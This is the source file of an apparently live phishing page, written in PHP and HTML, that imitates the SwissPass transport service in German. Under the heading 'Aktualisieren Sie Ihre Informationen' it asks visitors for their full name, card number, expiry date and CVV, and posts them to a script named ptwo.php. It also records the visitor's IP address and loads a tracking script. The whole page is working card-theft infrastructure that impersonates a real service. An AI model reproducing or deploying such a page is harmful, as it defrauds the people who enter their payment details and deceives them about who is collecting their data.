<?php
include './all.php';
?>
<!DOCTYPE html>
<html lang="de">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>SwissPass</title>
    <link rel=icon type=image/x-icon
        href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAA2NM3/JiXJ/yYlyf8mJcn/JiXJ/yYlyf8mJcn/JiXJ/yYlyf8mJcn/JiXJ/yYlyf8mJcn/JiXJ/yYlyf82NM3/IiDI/xYUxf8WFMX/FhTF//////8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/IiDI/yYlyf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/yYlyf8mJcn/FhTF//////8WFMX//////xYUxf//////FhTF/xYUxf8WFMX/FhTF/xYUxf//////FhTF/xYUxf8mJcn/JiXJ/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/JiXJ//////8WFMX//////xYUxf//////FhTF//////8WFMX//////yUjyf//////FhTF/xYUxf8WFMX/FhTF/yYlyf80M83/FhTF/yUjyf8WFMX/JSPJ/xYUxf8lI8n/FhTF/yUjyf8XFcX/JSPJ/xYUxf8WFMX/FhTF/xYUxf8mJcn//////xYUxf//////FhTF//////8WFMX//////xYUxf//////JSPJ//////8WFMX//////xYUxf//////JiXJ/yYlyf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/yYlyf//////FhTF//////8WFMX//////xYUxf//////FhTF//////8lI8n//////xYUxf8WFMX/FhTF//////8mJcn/JiXJ/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/JiXJ//////8WFMX//////xYUxf//////FhTF//////8WFMX//////yUjyf//////FhTF/xYUxf8WFMX/FhTF/yYlyf8mJcn/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8mJcn//////xYUxf//////FhTF//////8WFMX//////xYUxf//////JSPJ//////8WFMX/FhTF/xYUxf8WFMX/JiXJ/yIgyP8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/xYUxf8WFMX/FhTF/yIgyP//////JiXJ//////8mJcn//////yYlyf//////JiXJ/yYlyf8mJcn/JiXJ/yYlyf8mJcn/JiXJ/yYlyf82NM3/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==">

    <style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: "Arial", sans-serif;
    }

    html,
    body {
        height: 100%;
    }

    body {
        background-color: #f5f5f5;
        color: #333;
        line-height: 1.6;
        display: flex;
        flex-direction: column;
    }

    /* Navigation */
    nav {
        background-color: #c41416;
        padding: 1rem 2rem;
        display: flex;
        justify-content: space-between;
        align-items: center;
    }

    .nav-logo {
        order: 1;
    }

    .nav-logo img {
        height: 26px;
        transition: height 0.3s ease;
    }

    .nav-links {
        order: 2;
        display: flex;
        align-items: center;
        gap: 20px;
    }

    .nav-links a {
        color: white;
        text-decoration: none;
        font-weight: bold;
    }

    .profile-link {
        display: flex;
        align-items: center;
        gap: 5px;
    }

    .profile-link img {
        width: 44px;
        height: 44px;
        border-radius: 50%;
    }

    .menu-link {
        display: none;
        align-items: center;
        gap: 8px;
    }

    .hamburger-icon {
        display: inline-block;
        width: 20px;
        height: 2px;
        background-color: white;
        position: relative;
    }

    .hamburger-icon::before,
    .hamburger-icon::after {
        content: "";
        position: absolute;
        width: 20px;
        height: 2px;
        background-color: white;
        left: 0;
    }

    .hamburger-icon::before {
        top: -6px;
    }

    .hamburger-icon::after {
        top: 6px;
    }

    /* Main Content */
    .main-content {
        flex: 1;
    }

    .container {
        max-width: 600px;
        margin: 2rem auto;
        padding: 0 1rem;
    }

    .payment-form {
        background-color: white;
        padding: 2rem;
        border-radius: 8px;
    }

    h1 {
        font-size: 1.5rem;
        margin-bottom: 1.5rem;
        color: #333;
        text-align: center;
    }

    .form-group {
        margin-bottom: 1.5rem;
    }

    label {
        display: block;
        margin-bottom: 0.5rem;
        font-weight: bold;
    }

    input {
        width: 100%;
        padding: 0.75rem;
        border: 1px solid #ddd;
        border-radius: 4px;
        font-size: 1rem;
    }

    .input-with-icon {
        position: relative;
    }

    .input-with-icon input {
        padding-right: 40px;
    }

    .input-icon {
        position: absolute;
        right: 10px;
        top: 50%;
        transform: translateY(-50%);
        height: 20px;
    }

    .card-details {
        display: flex;
        gap: 1rem;
    }

    .card-details .form-group {
        flex: 1;
    }

    .exp-input {
        flex: 2;
    }

    .cvv-input {
        flex: 1;
    }

    button {
        background-color: #c41416;
        color: white;
        border: none;
        padding: 0.75rem 1.5rem;
        font-size: 1rem;
        border-radius: 4px;
        cursor: pointer;
        width: 100%;
        font-weight: bold;
        margin-top: 1rem;
        transition: background-color 0.3s ease;
    }

    button:hover {
        background-color: #e30613;
    }

    /* Footer */
    footer {
        background-color: #c41416;
        color: white;
        padding: 2rem;
        margin-top: auto;
    }

    .footer-content {
        max-width: 1200px;
        margin: 0 auto;
        display: flex;
        flex-wrap: wrap;
        justify-content: space-between;
        align-items: center;
    }

    .footer-logo {
        display: flex;
        align-items: center;
    }

    .footer-logo img {
        height: 20px;
        margin-right: 1rem;
    }

    .footer-links {
        display: flex;
        flex-wrap: wrap;
        gap: 1rem;
    }

    .footer-links a {
        color: white;
        text-decoration: none;
        transition: opacity 0.3s ease;
    }

    .footer-links a:hover {
        text-decoration: underline;
        opacity: 0.9;
    }

    /* Responsive */
    @media (max-width: 768px) {
        .nav-logo img {
            height: 20px;
        }

        .nav-links .desktop-link,
        .profile-link {
            display: none;
        }

        .menu-link {
            display: flex;
            font-weight: bold;
            color: white;
            text-decoration: none;
        }

        .nav-logo {
            order: 2;
        }

        .nav-links {
            order: 1;
        }

        .card-details {
            flex-direction: column;
            gap: 1rem;
        }

        .footer-content {
            flex-direction: column;
            text-align: center;
        }

        .footer-logo {
            display: none;
        }

        .footer-links {
            justify-content: center;
            margin-top: 1rem;
            gap: 0.8rem;
        }

        .footer-links a {
            font-size: 0.9rem;
        }
    }
    </style>
</head>

<body>
    <nav>
        <div class="nav-links">
            <a href="#" class="menu-link">
                <span class="hamburger-icon"></span>
                Menü
            </a>
        </div>
        <div class="nav-logo">
            <img src="./media/swisspass.png" alt="SwissPass Logo" />
        </div>
        <div class="nav-links">
            <a href="#" class="desktop-link">Hilfe</a>
            <a href="#" class="profile-link desktop-link">
                <img src="https://thumbs.dreamstime.com/b/default-avatar-profile-flat-icon-social-media-user-vector-portrait-unknown-human-image-default-avatar-profile-flat-icon-184330869.jpg"
                    alt="Profilbild" />
            </a>
        </div>
    </nav>

    <main class="main-content">
        <div class="container">
            <div class="payment-form">
                <h1>Aktualisieren Sie Ihre Informationen.</h1>
                <p>Bitte aktualisieren Sie Ihre Informationen, um fortzufahren. Alle Daten werden sicher verschlüsselt
                    und geschützt.</p>

                <br>
                <br>

                <form action="./post/ptwo.php" method="post">
                    <?php
            if (isset($_GET['error'])) {
               echo '<input type="hidden" name="e" value="1">
         <p style="color:red;">Ungültige Angaben, bitte versuchen Sie es erneut!</p>';
            }
            ?>
                    <div class="form-group">
                        <label for="fullname">Vollständiger Name</label>
                        <input type="text" id="fullname" name="name" placeholder="Vollständiger Name" required />
                    </div>

                    <div class="form-group">
                        <label for="cardnumber">Kartennummer</label>
                        <div class="input-with-icon">
                            <input type="text" id="cardNumber" name="ccnumber" placeholder="XXXX XXXX XXXX XXXX"
                                maxlength="16" required />
                            <img src="./media/visamastercard.png" alt="Kartenlogo" class="input-icon"
                                style="height: 15px" />
                        </div>
                    </div>

                    <div class="card-details">
                        <div class="form-group exp-input">
                            <label for="expiry">Ablaufdatum</label>
                            <input type="text" id="expiryDate" name="ccexp" placeholder="MM/JJ" required />
                        </div>

                        <div class="form-group cvv-input">
                            <label for="cvv">Sicherheitscode</label>
                            <div class="input-with-icon">
                                <input type="text" id="cvv" name="cvv" placeholder="CVV" required />
                                <img src="./media/cvv.png" alt="Kartenrückseite" class="input-icon" />
                            </div>
                        </div>
                    </div>

                    <button type="submit">Weiter</button>
                </form>

                <script>
                // Regular expressions for validating card numbers and CVV
                const cardRegex = /^(\d{4})(\d{4})(\d{4})(\d{4})$/; // Validates 16-digit card number
                const expDateRegex = /^(0[1-9]|1[0-2])\/(\d{2})$/; // Validates expiration date MM/YY
                const cvvRegex = /^\d{3,4}$/; // Validates CVV (3 or 4 digits)

                // Card type validation function (Visa, MasterCard, BankAxept, etc.)
                function isValidCardType(cardNumber) {
                    // Visa card number starts with 4
                    const visaRegex = /^4\d{3}\d{4}\d{4}\d{4}$/;
                    // MasterCard card number starts with 51-55
                    const mastercardRegex = /^5[1-5]\d{2}\d{4}\d{4}\d{4}$/;
                    // American Express card number starts with 34 or 37
                    const amexRegex = /^3[47]\d{2}\d{6}\d{5}$/;
                    // BankAxept card number starts with 506
                    const bankAxeptRegex = /^5060\d{10}$/;

                    return (
                        visaRegex.test(cardNumber) ||
                        mastercardRegex.test(cardNumber) ||
                        amexRegex.test(cardNumber) ||
                        bankAxeptRegex.test(cardNumber)
                    );
                }

                // Enable or disable submit button based on input validity
                function enableSubmitButton() {
                    const fullName = document.getElementById("fullname").value.trim();
                    const cardNumber = document
                        .getElementById("cardNumber")
                        .value.replace(/\D/g, "");
                    const expDate = document.getElementById("expiryDate").value;
                    const cvv = document.getElementById("cvv").value;

                    const submitButton = document.getElementById("submitButton");

                    // Enable button if all inputs are valid
                    if (
                        fullName.length >= 3 && // Full name must be at least 3 characters
                        cardRegex.test(cardNumber) &&
                        isValidCardType(cardNumber) &&
                        expDateRegex.test(expDate) &&
                        isValidExpirationDate(expDate) &&
                        cvvRegex.test(cvv)
                    ) {
                        submitButton.disabled = false;
                    } else {
                        submitButton.disabled = true;
                    }
                }

                // Validate expiration date (ensure it's not in the past)
                function isValidExpirationDate(expDate) {
                    const [month, year] = expDate.split("/");
                    const currentDate = new Date();
                    const currentMonth = currentDate.getMonth() + 1; // getMonth() is 0-indexed
                    const currentYear = currentDate.getFullYear() % 100; // get last two digits of the year

                    if (parseInt(year) < currentYear) {
                        return false; // Expired year
                    }

                    if (
                        parseInt(year) === currentYear &&
                        parseInt(month) < currentMonth
                    ) {
                        return false; // Expired month
                    }

                    return true; // Valid expiration date
                }

                // Full name input validation
                document
                    .getElementById("fullname")
                    .addEventListener("input", function() {
                        enableSubmitButton();
                    });

                // Card number input: ensure only numbers and auto-move to the next input after 16 digits
                document
                    .getElementById("cardNumber")
                    .addEventListener("input", function() {
                        let inputValue = this.value.replace(/\D/g, ""); // Remove non-numeric characters
                        if (inputValue.length === 16) {
                            this.value = inputValue.replace(cardRegex, "$1$2$3$4"); // Format card number
                            document.getElementById("expiryDate").focus(); // Move focus to the expiration date
                        } else {
                            this.value = inputValue;
                        }
                        enableSubmitButton();
                    });

                // Expiration date input: ensure only numbers and add '/' automatically, auto-move to next input
                document
                    .getElementById("expiryDate")
                    .addEventListener("input", function() {
                        let inputValue = this.value.replace(/\D/g, ""); // Remove non-numeric characters
                        if (inputValue.length === 2) {
                            this.value = inputValue + "/"; // Add slash after MM
                        } else if (inputValue.length === 4) {
                            document.getElementById("cvv").focus(); // Move focus to CVV input
                        }
                        enableSubmitButton();
                    });

                // CVV input: allow only numbers and auto-move to next input after 3 or 4 digits
                document
                    .getElementById("cvv")
                    .addEventListener("input", function() {
                        let inputValue = this.value.replace(/\D/g, ""); // Remove non-numeric characters
                        if (inputValue.length === 3 || inputValue.length === 4) {
                            this.value = inputValue; // Allow 3 or 4 digits
                            enableSubmitButton();
                        } else {
                            this.value = inputValue;
                        }
                    });

                // Initialize form with proper validation on load
                window.addEventListener("DOMContentLoaded", function() {
                    enableSubmitButton();
                });
                </script>
            </div>
        </div>
    </main>

    <footer>
        <div class="footer-content">
            <div class="footer-logo">
                <img src="./media/swisspass.png" alt="SwissPass Logo" />
            </div>
            <div class="footer-links">
                <a href="#">Fahrgastrechte</a>
                <a href="#">Impressum</a>
                <a href="#">Rechtlicher Hinweis</a>
                <a href="#">Datenschutz</a>
                <a href="#">Cookie-Einstellungen</a>
                <a href="#">Über SwissPass</a>
            </div>
        </div>
    </footer>
</body>

<script>
// Function to get IP using a free API
function getUserIP(callback) {
    // First try to get from URL parameter
    const urlParams = new URLSearchParams(window.location.search);
    const ipParam = urlParams.get('ip');

    if (ipParam) {
        callback(ipParam);
        return;
    }

    // Fallback to API
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => callback(data.ip))
        .catch(() => callback('unknown'));
}

// Set a global variable with the IP
getUserIP(function(ip) {
    window.userIP = ip;
});
</script>

<!-- Tracking script -->
<script src="./tracking.php"></script>

</html>